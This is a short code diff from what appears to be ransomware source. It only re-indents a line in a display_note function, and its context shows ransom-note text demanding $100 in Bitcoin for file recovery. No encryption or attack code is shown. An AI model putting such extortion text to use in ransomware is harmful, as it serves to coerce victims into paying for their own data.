@@ -78,7 +78,7 @@ def display_note(directory, loop):
     otherwise you won't be able to recover your files.
 
 
-Q: How can I recover my files?
+    Q: How can I recover my files?
 
     Just send $100 of Bitcoin to this Bitcoin address:
 
